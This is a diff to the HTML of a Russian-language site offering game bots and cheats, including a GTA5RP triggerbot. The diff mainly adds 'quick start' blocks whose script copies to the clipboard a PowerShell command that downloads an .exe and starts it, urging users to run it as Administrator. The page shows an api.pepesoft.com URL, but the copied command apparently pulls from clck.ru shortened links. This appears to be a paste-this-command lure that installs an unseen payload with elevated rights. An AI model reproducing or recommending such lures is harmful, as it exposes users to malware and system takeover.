@@ -6,6 +6,7 @@
     <meta name="google-site-verification" content="aerCIsY79eS0t6NsRf4MltV5rLw7VvaBFZdabMq9WsM" />
     <title>2026 Боты для ALBION | GTA5RP | MAJESTIC FISH | pepesoft777</title>
     <link rel="canonical" href="https://bots.pepesoft.ru/" />
+    
     <meta name="description" content="Скачать боты для Albion Online, GTA 5 RP, Majestic, CS2, Throne and Liberty, Russian Fishing 4. Автоматизация фарма, рыбалки, прокачки. Безопасно и анонимно.">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="icon" href="https://pepesoft.ru/favicon.ico" type="image/x-icon">
@@ -30,6 +31,11 @@
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
     
     <script src="https://unpkg.com/lenis@1.0.45/dist/lenis.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+      .font-unbounded { font-family: 'Unbounded', sans-serif; }
+      .font-geologica { font-family: 'Geologica', sans-serif; }
+    </style>
     <meta name="referrer" content="no-referrer">
     
     <style>
@@ -205,18 +211,23 @@
     }
 
     h1 {
-        font-size: 5.5rem;
-        margin-bottom: 24px;
+        font-size: 7rem;
+        margin-bottom: 32px;
         font-weight: 900;
-        letter-spacing: -3px;
-        line-height: 1.1;
-        background: linear-gradient(135deg, #ffffff 0%, #a5b4fc 100%);
+        letter-spacing: -6px;
+        line-height: 1;
+        background: linear-gradient(135deg, #ffffff 0%, #ffffff 40%, #a5b4fc 100%);
         -webkit-background-clip: text;
         -webkit-text-fill-color: transparent;
         opacity: 0;
         transform: translateY(30px);
         transition: var(--transition);
+        text-shadow: none;
+        position: relative;
+        display: inline-block;
+        filter: drop-shadow(0 0 60px rgba(165, 180, 252, 0.18));
     }
+
 
     h1.animate {
         opacity: 1;
@@ -388,7 +399,8 @@
     .card-title {
         font-family: "Unbounded", sans-serif;
         text-transform: uppercase;
-        font-weight: 400;
+        font-weight: 700;
+        font-size: 1.55rem;
         margin-bottom: 24px;
         color: var(--white);
         letter-spacing: 1px;
@@ -980,7 +992,36 @@
     
     <div class="container">
         <header>
-            <h1>Pepesoft</h1>
+            <h1 style="
+                font-size: clamp(4rem, 12vw, 9rem);
+                font-weight: 900;
+                letter-spacing: -0.06em;
+                line-height: 1;
+                margin-bottom: 16px;
+                font-family: 'Montserrat', sans-serif;
+                
+                /* Устанавливаем чистый белый цвет */
+                color: #ffffff; 
+                
+                /* Полностью очищаем все фоновые и обтравочные свойства */
+                background: none !important;
+                -webkit-background-clip: unset !important;
+                background-clip: unset !important;
+                -webkit-text-fill-color: unset !important;
+                
+                /* Убираем фильтр, если полоска была тенью */
+                filter: none;
+                
+                display: block;
+                position: relative;
+                
+                opacity: 0;
+                transform: translateY(30px);
+                transition: all 0.8s cubic-bezier(0.16, 1, 0.3, 1);
+            ">
+                PEPESOFT
+            </h1>
+            
             <p class="subtitle">Универсальные боты без бана Максимальный профит Полная анонимность.</p>
         </header>
 
@@ -1209,6 +1250,341 @@
 
             </div>
         </section>
+
+        <!-- QUICK START BLOCKS -->
+        <section style="margin: 140px 0;">
+          <div class="container" style="display: flex; flex-direction: column; gap: 32px; align-items: center;">
+
+            <!-- Block 1: .NET CLI -->
+            <div class="w-full" style="max-width: 768px; width: 100%;">
+              <div style="width:100%; background:rgba(255,255,255,0.05); backdrop-filter:blur(24px); -webkit-backdrop-filter:blur(24px); border-radius:1rem; border:1px solid rgba(255,255,255,0.1); padding:2rem; box-shadow:0 8px 32px 0 rgba(0,0,0,0.5); transition:all 0.5s; position:relative;" id="netcliBlock">
+                <div style="position:absolute;inset:0;border:1px solid #a855f7;border-radius:1rem;opacity:0;pointer-events:none;transition:opacity 0.3s;z-index:10;" id="successBorder1"></div>
+                <div style="display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:1rem;margin-bottom:1.5rem;padding-bottom:1.5rem;border-bottom:1px solid rgba(255,255,255,0.1);">
+                  <div>
+                    <div style="display:flex;align-items:center;gap:0.75rem;margin-bottom:0.5rem;">
+                      <span style="background:#a855f7;color:#000;font-size:10px;font-family:'Unbounded',sans-serif;font-weight:700;text-transform:uppercase;letter-spacing:0.1em;padding:2px 8px;border-radius:4px;">.NET CLI</span>
+                      <h2 style="font-size:1.125rem;font-family:'Unbounded',sans-serif;font-weight:700;color:#fff;text-transform:uppercase;letter-spacing:-0.025em;margin:0;">Быстрый запуск</h2>
+                    </div>
+                    <p style="color:rgba(255,255,255,0.5);font-size:0.75rem;font-family:'Geologica',sans-serif;font-weight:500;letter-spacing:0.05em;margin:0;">Установите окружение и выберите сборку для автоматического копирования команды.</p>
+                  </div>
+                  <div style="display:flex;align-items:center;gap:0.5rem;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);padding:6px 12px;border-radius:0.75rem;font-size:0.75rem;font-family:'Geologica',sans-serif;font-weight:700;color:#c084fc;letter-spacing:0.1em;">
+                    <span style="width:8px;height:8px;border-radius:50%;background:#c084fc;display:inline-block;animation:pulse2 2s infinite;"></span>
+                    <span>SDK READY</span>
+                  </div>
+                </div>
+                <div style="margin-bottom:1.5rem;">
+                  <a href="https://builds.dotnet.microsoft.com/dotnet/Sdk/10.0.301/dotnet-sdk-10.0.301-win-x64.exe" download="dotnet-sdk-10.0.301-win-x64.exe" style="display:flex;align-items:center;justify-content:space-between;background:linear-gradient(to right,rgba(168,85,247,0.2),rgba(88,28,135,0.3));border:1px solid rgba(168,85,247,0.4);border-radius:0.75rem;padding:1.25rem;transition:all 0.3s;text-decoration:none;">
+                    <div style="display:flex;align-items:center;gap:1.25rem;">
+                      <div style="color:#a855f7;flex-shrink:0;">
+                        <svg width="48" height="48" viewBox="0 0 88 88" fill="currentColor"><path d="M0 12.402l35.687-4.86.016 34.423-35.67.203-.033-29.766zm35.67 33.529l.016 34.42-35.686-4.846v-29.37l35.67-.204zm4.326-39.022l47.966-6.909v41.01l-47.966.273v-34.374zm47.966 39.467v41.012l-47.966-6.91v-34.373l47.966.271z"/></svg>
+                      </div>
+                      <div>
+                        <h3 style="font-size:0.875rem;font-family:'Unbounded',sans-serif;font-weight:700;color:#fff;text-transform:uppercase;letter-spacing:0.05em;margin:0 0 4px 0;">Скачать .NET SDK / CLI</h3>
+                        <p style="color:rgba(255,255,255,0.4);font-family:'Geologica',sans-serif;font-size:0.75rem;margin:0;">Необходимый компонент для компиляции и работы всех игровых модулей</p>
+                      </div>
+                    </div>
+                    <svg style="color:rgba(168,85,247,0.6);width:20px;height:20px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M9 5l7 7-7 7"/></svg>
+                  </a>
+                </div>
+                <div style="background:rgba(0,0,0,0.4);border-radius:0.75rem;padding:1.25rem;border:1px solid rgba(255,255,255,0.05);position:relative;">
+                  <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:1rem;padding-bottom:0.5rem;border-bottom:1px solid rgba(255,255,255,0.05);">
+                    <div style="display:flex;align-items:center;gap:0.5rem;font-size:11px;color:rgba(255,255,255,0.4);letter-spacing:0.1em;font-family:monospace;">
+                      <div style="display:flex;gap:6px;"><span style="width:8px;height:8px;border-radius:50%;background:rgba(255,255,255,0.1);display:inline-block;"></span><span style="width:8px;height:8px;border-radius:50%;background:rgba(255,255,255,0.1);display:inline-block;"></span><span style="width:8px;height:8px;border-radius:50%;background:rgba(255,255,255,0.1);display:inline-block;"></span></div>
+                      <span style="font-family:'Geologica',sans-serif;font-size:10px;text-transform:uppercase;margin-left:4px;">Administrator: cmd</span>
+                    </div>
+                    <div style="color:rgba(255,255,255,0.4);cursor:pointer;" id="copyIcon1">
+                      <svg id="iconCopy1" style="width:16px;height:16px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3"/></svg>
+                      <svg id="iconCheck1" style="width:16px;height:16px;color:#c084fc;display:none;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
+                    </div>
+                  </div>
+                  <div style="display:flex;flex-wrap:wrap;align-items:center;gap:8px 10px;color:rgba(255,255,255,0.9);font-size:0.875rem;font-family:monospace;">
+                    <span style="color:#c084fc;font-weight:bold;">></span>
+                    <span>dotnet</span>
+                    <span style="color:rgba(255,255,255,0.5);">tool update -g</span>
+                    <button id="dropBtn1" onclick="toggleDropdown1(event)" style="display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,0.05);color:#c084fc;border:1px solid rgba(168,85,247,0.3);padding:6px 12px;border-radius:8px;font-size:0.75rem;font-family:'Unbounded',sans-serif;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;cursor:pointer;">
+                      <span id="selectedLabel1">выбрать панель</span>
+                      <svg id="chevron1" style="width:14px;height:14px;transition:transform 0.3s;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
+                    </button>
+                    <span style="color:rgba(255,255,255,0.5);" id="commandSuffix1"></span>
+                    <span style="width:8px;height:16px;background:#c084fc;display:inline-block;animation:pulse2 1s infinite;"></span>
+                  </div>
+                  <div id="copyBadge1" style="position:absolute;right:16px;bottom:16px;background:#a855f7;color:#000;font-size:10px;font-family:'Unbounded',sans-serif;font-weight:700;text-transform:uppercase;letter-spacing:0.1em;padding:4px 8px;border-radius:4px;opacity:0;transition:all 0.3s;pointer-events:none;">СКОПИРОВАНО!</div>
+                </div>
+                <div style="margin-top:1.25rem;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.1);border-radius:0.75rem;padding:1rem;display:flex;align-items:flex-start;gap:1rem;">
+                  <div style="color:#c084fc;flex-shrink:0;margin-top:2px;">
+                    <svg style="width:20px;height:20px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 11c0 3.517-1.009 6.799-2.753 9.571m-3.44-2.04l.054-.09A13.916 13.916 0 008 11a4 4 0 118 0c0 1.017-.07 2.019-.203 3m-2.118 6.844A21.88 21.88 0 0015.171 17m3.839 1.132c.645-2.266.99-4.659.99-7.132A8 8 0 008 4.07M3 15.364c.64-1.319 1-2.8 1-4.364 0-1.457.39-2.823 1.07-4"/></svg>
+                  </div>
+                  <div>
+                    <h4 style="color:#fff;font-family:'Unbounded',sans-serif;font-weight:700;font-size:0.75rem;text-transform:uppercase;letter-spacing:0.1em;margin:0 0 4px 0;">Требуются права Администратора</h4>
+                    <p style="color:rgba(255,255,255,0.4);font-family:'Geologica',sans-serif;font-size:0.75rem;line-height:1.6;margin:0;">Запускайте вашу командную строку (Терминал / Командная строка) строго от имени Администратора. Без этих привилегий .NET CLI заблокирует инициализацию сетевых хуков решения.</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- Block 2: POWERSHELL -->
+            <div style="max-width: 768px; width: 100%;">
+              <div style="width:100%;background:rgba(255,255,255,0.05);backdrop-filter:blur(24px);-webkit-backdrop-filter:blur(24px);border-radius:1rem;border:1px solid rgba(255,255,255,0.1);padding:2rem;box-shadow:0 8px 32px 0 rgba(0,0,0,0.5);transition:all 0.5s;position:relative;" id="psBlock">
+                <div style="position:absolute;inset:0;border:1px solid #a855f7;border-radius:1rem;opacity:0;pointer-events:none;transition:opacity 0.3s;z-index:10;" id="successBorder2"></div>
+                <div style="display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:1rem;margin-bottom:1.5rem;padding-bottom:1.5rem;border-bottom:1px solid rgba(255,255,255,0.1);">
+                  <div>
+                    <div style="display:flex;align-items:center;gap:0.75rem;margin-bottom:0.5rem;">
+                      <span style="background:#a855f7;color:#000;font-size:10px;font-family:'Unbounded',sans-serif;font-weight:700;text-transform:uppercase;letter-spacing:0.1em;padding:2px 8px;border-radius:4px;">POWERSHELL</span>
+                      <h2 style="font-size:1.125rem;font-family:'Unbounded',sans-serif;font-weight:700;color:#fff;text-transform:uppercase;letter-spacing:-0.025em;margin:0;">Быстрый запуск</h2>
+                    </div>
+                    <p style="color:rgba(255,255,255,0.5);font-size:0.75rem;font-family:'Geologica',sans-serif;font-weight:500;letter-spacing:0.05em;margin:0;">Выберите сборку. Скрипт автоматически сформирует команду для скачивания и запуска.</p>
+                  </div>
+                  <div style="display:flex;align-items:center;gap:0.5rem;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);padding:6px 12px;border-radius:0.75rem;font-size:0.75rem;font-family:'Geologica',sans-serif;font-weight:700;color:#c084fc;letter-spacing:0.1em;">
+                    <span style="width:8px;height:8px;border-radius:50%;background:#c084fc;display:inline-block;animation:pulse2 2s infinite;"></span>
+                    <span>POWERSHELL READY</span>
+                  </div>
+                </div>
+                <div style="background:rgba(0,0,0,0.4);border-radius:0.75rem;padding:1.25rem;border:1px solid rgba(255,255,255,0.05);position:relative;">
+                  <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:1.25rem;padding-bottom:0.5rem;border-bottom:1px solid rgba(255,255,255,0.05);">
+                    <div style="display:flex;align-items:center;gap:0.5rem;font-size:11px;color:rgba(255,255,255,0.4);letter-spacing:0.1em;font-family:monospace;">
+                      <div style="display:flex;gap:6px;"><span style="width:8px;height:8px;border-radius:50%;background:rgba(255,255,255,0.1);display:inline-block;"></span><span style="width:8px;height:8px;border-radius:50%;background:rgba(255,255,255,0.1);display:inline-block;"></span><span style="width:8px;height:8px;border-radius:50%;background:rgba(255,255,255,0.1);display:inline-block;"></span></div>
+                      <span style="font-family:'Geologica',sans-serif;font-size:10px;text-transform:uppercase;margin-left:4px;">Administrator: powershell</span>
+                    </div>
+                    <div style="display:flex;align-items:center;gap:0.75rem;position:relative;">
+                      <div id="copyBadge2" style="background:#a855f7;color:#000;font-size:10px;font-family:'Unbounded',sans-serif;font-weight:700;text-transform:uppercase;letter-spacing:0.1em;padding:2px 8px;border-radius:4px;opacity:0;transition:all 0.3s;pointer-events:none;">СКОПИРОВАНО!</div>
+                      <div style="color:rgba(255,255,255,0.4);cursor:pointer;" onclick="executeCopy2()" title="Копировать команду">
+                        <svg id="iconCopy2" style="width:16px;height:16px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3"/></svg>
+                        <svg id="iconCheck2" style="width:16px;height:16px;color:#c084fc;display:none;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
+                      </div>
+                    </div>
+                  </div>
+                  <div style="margin-bottom:1.25rem;">
+                    <button id="dropBtn2" onclick="toggleDropdown2(event)" style="display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,0.05);color:#c084fc;border:1px solid rgba(168,85,247,0.3);padding:8px 16px;border-radius:0.75rem;font-size:0.75rem;font-family:'Unbounded',sans-serif;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;cursor:pointer;">
+                      <span id="selectedLabel2">GTA 5 RP</span>
+                      <svg id="chevron2" style="width:14px;height:14px;transition:transform 0.3s;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
+                    </button>
+                  </div>
+                  <div style="display:flex;flex-wrap:wrap;align-items:center;gap:6px 6px;color:rgba(255,255,255,0.9);font-size:0.875rem;font-family:monospace;background:rgba(0,0,0,0.2);padding:12px;border-radius:8px;border:1px solid rgba(255,255,255,0.02);word-break:break-all;">
+                    <span style="color:#c084fc;font-weight:bold;margin-right:4px;">></span>
+                    <span>iwr</span>
+                    <span style="color:rgba(255,255,255,0.4);">"</span><span id="cmdUrl2" style="color:#c084fc;font-weight:bold;transition:all 0.3s;">https://api.pepesoft.com/dw/gta5rp.exe</span><span style="color:rgba(255,255,255,0.4);">"</span>
+                    <span style="color:rgba(255,255,255,0.6);">-outf</span>
+                    <span id="cmdFile2a" style="color:#c084fc;font-weight:bold;transition:all 0.3s;">gta5.exe</span><span style="color:rgba(255,255,255,0.4);">;</span>
+                    <span>start</span>
+                    <span id="cmdFile2b" style="color:#c084fc;font-weight:bold;transition:all 0.3s;">gta5.exe</span>
+                    <span style="width:8px;height:16px;background:#c084fc;display:inline-block;animation:pulse2 1s infinite;margin-left:4px;"></span>
+                  </div>
+                </div>
+                <div style="margin-top:1.25rem;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.1);border-radius:0.75rem;padding:1rem;display:flex;align-items:flex-start;gap:1rem;">
+                  <div style="color:#c084fc;flex-shrink:0;margin-top:2px;">
+                    <svg style="width:20px;height:20px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 11c0 3.517-1.009 6.799-2.753 9.571m-3.44-2.04l.054-.09A13.916 13.916 0 008 11a4 4 0 118 0c0 1.017-.07 2.019-.203 3m-2.118 6.844A21.88 21.88 0 0015.171 17m3.839 1.132c.645-2.266.99-4.659.99-7.132A8 8 0 008 4.07M3 15.364c.64-1.319 1-2.8 1-4.364 0-1.457.39-2.823 1.07-4"/></svg>
+                  </div>
+                  <div>
+                    <h4 style="color:#fff;font-family:'Unbounded',sans-serif;font-weight:700;font-size:0.75rem;text-transform:uppercase;letter-spacing:0.1em;margin:0 0 4px 0;">Требуются права Администратора</h4>
+                    <p style="color:rgba(255,255,255,0.4);font-family:'Geologica',sans-serif;font-size:0.75rem;line-height:1.6;margin:0;">Запускайте вашу командную строку (Терминал / Командная строка) строго от имени Администратора. Без этих привилегий PowerShell заблокирует инициализацию сетевых хуков решения.</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+          </div>
+        </section>
+
+        <style>
+          @keyframes pulse2 { 0%,100%{opacity:1;} 50%{opacity:0.4;} }
+        </style>
+
+        <script>
+          // ── PORTAL DROPDOWNS ──────────────────────────────────────────
+          // backdrop-filter creates a new stacking context that clips children.
+          // Solution: move both menus to <body> as portals, position with fixed.
+
+          const ITEMS_NET = [
+            {v:'gta5rp-x-x',   n:'GTA 5 RP'},
+            {v:'trigger-x-x',  n:'Triggerbot GTA5RP / Majestic'},
+            {v:'majestic-x-x', n:'Majestic'},
+            {v:'grandrp-x-x',  n:'GRAND RP'},
+            {v:'albion-x-x',   n:'Albion Online'},
+            {v:'calc-x-x',     n:'Profit Calculator'},
+            {v:'rusfish4-x-x', n:'Russian Fishing 4'},
+            {v:'rmrp-x-x',     n:'R M R P'},
+            {v:'throne-x-x',   n:'Throne and Liberty Auto - Farm'},
+            {v:'amazing-x-x',  n:'Amazing RP'},
+            {v:'l2-x-x',       n:'Lineage 2 Essence'},
+          ];
+
+          const ITEMS_PS = [
+            {n:'GTA 5 RP',                     u:'https://clck.ru/3UKAYA', f:'gta5.exe'},
+            {n:'Triggerbot GTA5RP / Majestic',  u:'https://clck.ru/3UKAZR', f:'trigger.exe'},
+            {n:'Majestic',                      u:'https://clck.ru/3UKAYt', f:'majestic.exe'},
+            {n:'GRAND RP',                      u:'https://clck.ru/3UKAZx', f:'grand_rp.exe'},
+            {n:'Albion Online',                 u:'https://clck.ru/3UKAaS', f:'albion.exe'},
+            {n:'Profit Calculator',             u:'https://clck.ru/3UKAb8', f:'calc.exe'},
+            {n:'Russian Fishing 4',             u:'https://clck.ru/3UKAbo', f:'rf4.exe'},
+            {n:'R M R P',                       u:'https://clck.ru/3UKAcZ', f:'rmrp.exe'},
+            {n:'Throne and Liberty Auto - Farm',u:'https://clck.ru/3UKAdN', f:'tl_farm.exe'},
+            {n:'Amazing RP',                    u:'https://clck.ru/3UKAdp', f:'amazing.exe'},
+            {n:'Lineage 2 Essence',             u:'https://clck.ru/3UKAeH', f:'l2.exe'},
+          ];
+
+          const MENU_STYLE = `
+            position:fixed;
+            background:#0a0a0e;
+            border:1px solid rgba(168,85,247,0.35);
+            border-radius:12px;
+            box-shadow:0 20px 60px rgba(0,0,0,0.9), 0 0 0 1px rgba(168,85,247,0.1);
+            z-index:2147483647;
+            min-width:280px;
+            padding:6px;
+            display:none;
+            overflow:hidden;
+          `;
+
+          const BTN_STYLE = `
+            display:block;width:100%;text-align:left;
+            padding:10px 14px;border-radius:8px;
+            color:#e2e8f0;font-size:0.72rem;
+            font-family:'Unbounded',sans-serif;font-weight:700;
+            text-transform:uppercase;letter-spacing:0.05em;
+            cursor:pointer;background:transparent;border:none;
+            transition:background 0.15s,color 0.15s;
+          `;
+
+          function buildMenuHTML(items, onclick) {
+            return items.map(it => {
+              const data = it.v
+                ? `data-value="${it.v}" data-name="${it.n}"`
+                : `data-name="${it.n}" data-url="${it.u}" data-file="${it.f}"`;
+              return `<button style="${BTN_STYLE}" onmouseover="this.style.background='#a855f7';this.style.color='#000'" onmouseout="this.style.background='transparent';this.style.color='#e2e8f0'" onclick="${onclick}(this)" ${data}>${it.n}</button>`;
+            }).join('');
+          }
+
+          // Create portal menus and append to body
+          const portal1 = document.createElement('div');
+          portal1.id = 'portalMenu1';
+          portal1.setAttribute('style', MENU_STYLE);
+          portal1.innerHTML = buildMenuHTML(ITEMS_NET, 'selectItem1');
+          document.body.appendChild(portal1);
+
+          const portal2 = document.createElement('div');
+          portal2.id = 'portalMenu2';
+          portal2.setAttribute('style', MENU_STYLE);
+          portal2.innerHTML = buildMenuHTML(ITEMS_PS, 'selectItem2');
+          document.body.appendChild(portal2);
+
+          let activePortal = null;
+          let activeChevron = null;
+          let activeAnchor = null;
+
+          function positionPortal(portal, anchor) {
+            const r = anchor.getBoundingClientRect();
+            portal.style.top  = (r.bottom + 6) + 'px';
+            portal.style.left = r.left + 'px';
+          }
+
+          function openPortal(portal, anchor, chevron) {
+            if (activePortal && activePortal !== portal) closeAll();
+            activePortal  = portal;
+            activeChevron = chevron;
+            activeAnchor  = anchor;
+            positionPortal(portal, anchor);
+            portal.style.display = 'block';
+            chevron.style.transform = 'rotate(180deg)';
+          }
+
+          function closeAll() {
+            if (activePortal)  activePortal.style.display  = 'none';
+            if (activeChevron) activeChevron.style.transform = '';
+            activePortal = activeChevron = activeAnchor = null;
+          }
+
+          // Reposition on scroll/resize so menu tracks button
+          window.addEventListener('scroll', () => {
+            if (activePortal && activeAnchor) positionPortal(activePortal, activeAnchor);
+          }, true);
+          window.addEventListener('resize', () => {
+            if (activePortal && activeAnchor) positionPortal(activePortal, activeAnchor);
+          });
+          document.addEventListener('click', e => {
+            if (!e.target.closest('#portalMenu1') && !e.target.closest('#portalMenu2')
+                && !e.target.closest('#dropBtn1') && !e.target.closest('#dropBtn2')) {
+              closeAll();
+            }
+          });
+
+          // ── Block 1 toggle
+          function toggleDropdown1(e) {
+            e.stopPropagation();
+            const btn = document.getElementById('dropBtn1');
+            const chv = document.getElementById('chevron1');
+            if (portal1.style.display !== 'none') { closeAll(); return; }
+            openPortal(portal1, btn, chv);
+          }
+
+          function selectItem1(btn) {
+            const fullValue = btn.getAttribute('data-value');
+            const name      = btn.getAttribute('data-name');
+            document.getElementById('selectedLabel1').innerText = name;
+            const cleanKey = fullValue.replace('-x-x', '');
+            document.getElementById('commandSuffix1').innerText = `&& ${cleanKey}-run`;
+            closeAll();
+            copyToClipboard1(`dotnet tool update -g ${fullValue} && ${cleanKey}-run`);
+          }
+
+          function copyToClipboard1(text) {
+            navigator.clipboard.writeText(text).then(() => {
+              document.getElementById('iconCopy1').style.display  = 'none';
+              document.getElementById('iconCheck1').style.display = 'block';
+              document.getElementById('copyBadge1').style.opacity = '1';
+              document.getElementById('successBorder1').style.opacity = '1';
+              setTimeout(() => {
+                document.getElementById('iconCopy1').style.display  = 'block';
+                document.getElementById('iconCheck1').style.display = 'none';
+                document.getElementById('copyBadge1').style.opacity = '0';
+                document.getElementById('successBorder1').style.opacity = '0';
+              }, 2000);
+            });
+          }
+
+          // ── Block 2 toggle
+          let ps2Url = 'https://api.pepesoft.com/dw/gta5rp.exe';
+          let ps2File = 'gta5.exe';
+
+          function toggleDropdown2(e) {
+            e.stopPropagation();
+            const btn = document.getElementById('dropBtn2');
+            const chv = document.getElementById('chevron2');
+            if (portal2.style.display !== 'none') { closeAll(); return; }
+            openPortal(portal2, btn, chv);
+          }
+
+          function selectItem2(btn) {
+            const name = btn.getAttribute('data-name');
+            const url  = btn.getAttribute('data-url');
+            const file = btn.getAttribute('data-file');
+            document.getElementById('selectedLabel2').innerText = name;
+            ps2Url = url; ps2File = file;
+            document.getElementById('cmdUrl2').innerText   = url;
+            document.getElementById('cmdFile2a').innerText = file;
+            document.getElementById('cmdFile2b').innerText = file;
+            closeAll();
+            executeCopy2();
+          }
+
+          function executeCopy2() {
+            copyToClipboard2(`iwr "${ps2Url}" -outf ${ps2File}; start ${ps2File}`);
+          }
+
+          function copyToClipboard2(text) {
+            navigator.clipboard.writeText(text).then(() => {
+              document.getElementById('iconCopy2').style.display  = 'none';
+              document.getElementById('iconCheck2').style.display = 'block';
+              document.getElementById('copyBadge2').style.opacity = '1';
+              document.getElementById('successBorder2').style.opacity = '1';
+              setTimeout(() => {
+                document.getElementById('iconCopy2').style.display  = 'block';
+                document.getElementById('iconCheck2').style.display = 'none';
+                document.getElementById('copyBadge2').style.opacity = '0';
+                document.getElementById('successBorder2').style.opacity = '0';
+              }, 2000);
+            });
+          }
+        </script>
 
         <section class="roulette-section">
             <h2 class="section-title">Наши разработки</h2>
@@ -1556,7 +1932,10 @@
 
         // Стартовые анимации шапки
         setTimeout(() => {
-            document.querySelector('h1')?.classList.add('animate');
+            const h1 = document.querySelector('h1');
+            if (h1) { h1.style.opacity = '1'; h1.style.transform = 'translateY(0)'; }
+            const line = document.getElementById('logo-line');
+            if (line) line.style.opacity = '1';
             document.querySelector('.subtitle')?.classList.add('animate');
         }, 100);
 
